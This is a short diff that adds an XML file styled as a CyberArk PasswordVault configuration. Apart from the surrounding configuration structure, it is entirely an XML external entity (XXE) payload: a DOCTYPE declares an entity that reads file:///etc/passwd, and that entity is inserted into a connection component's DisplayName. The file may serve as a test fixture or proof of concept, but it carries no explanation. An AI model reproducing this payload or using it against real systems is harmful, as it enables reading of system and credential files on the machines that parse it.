@@ -1,0 +1,10 @@
+<?xml version="1.0"?>
+<!DOCTYPE PasswordVaultConfiguration [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<PasswordVaultConfiguration>
+  <ConnectionComponents>
+    <ConnectionComponent Id="PSM-XXE" DisplayName="&xxe;" Type="CyberArk.PasswordVault.TransparentConnection.PSM.PSMConnectionComponent, CyberArk.PasswordVault.TransparentConnection.PSM" />
+  </ConnectionComponents>
+</PasswordVaultConfiguration>
+
